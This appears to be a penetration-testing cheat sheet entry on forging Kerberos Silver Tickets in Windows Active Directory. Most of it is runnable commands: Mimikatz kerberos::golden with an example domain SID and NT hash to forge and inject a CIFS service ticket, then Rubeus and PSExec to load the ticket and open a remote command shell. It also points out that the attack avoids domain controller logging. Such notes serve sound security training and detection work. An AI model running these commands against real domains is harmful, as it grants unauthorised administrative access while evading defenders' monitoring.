# 09.14 Silver Ticket Windows

> Forge a TGS for a single SPN with `mimikatz kerberos::golden /target /service` — no DC traffic required.

## Overview

A Silver Ticket forges a TGS for a specific service using the service or machine account's NT hash — no DC communication required. Prerequisites are domain SID, service account NT hash, and target SPN. Mimikatz kerberos::golden with /target /service creates it; /ptt injects directly, /ticket:file.kirbi saves for a sacrificial process. Rubeus createnetonly opens a blank process; Rubeus ptt imports the kirbi; PSExec uses it for a shell.

## Steps

- Get domain SID with PowerView Get-DomainSID.
- Forge with mimikatz kerberos::golden /domain /user /sid /rc4 /target /service /ptt (or /ticket:file.kirbi to save).
- Verify with klist; access the service with dir //target/c$.
- For PSExec usage: save to .kirbi, open a sacrificial process with Rubeus createnetonly, inject with Rubeus ptt /ticket:sql01.kirbi, then run PSExec.exe.
- Silver Tickets are stealthier than Golden Tickets — no DC log; logs only appear on target host.

## Commands

### Mimikatz forge Silver Ticket (inject)

```powershell
mimikatz # kerberos::golden /domain:<DOMAIN>.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.<DOMAIN>.local /service:cifs /ptt
```

### Mimikatz forge Silver Ticket (save to kirbi)

```powershell
C:\Tools> mimikatz.exe "kerberos::golden /domain:<DOMAIN>.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.<DOMAIN>.local /service:cifs /ticket:sql01.kirbi" exit
```

### Rubeus createnetonly sacrificial process

```powershell
Rubeus.exe createnetonly /program:cmd.exe /show
```

### Rubeus ptt import kirbi

```powershell
Rubeus.exe ptt /ticket:sql01.kirbi
```

### PSExec with Silver Ticket

```powershell
PSExec.exe -accepteula \\sql01.<DOMAIN>.local cmd
```
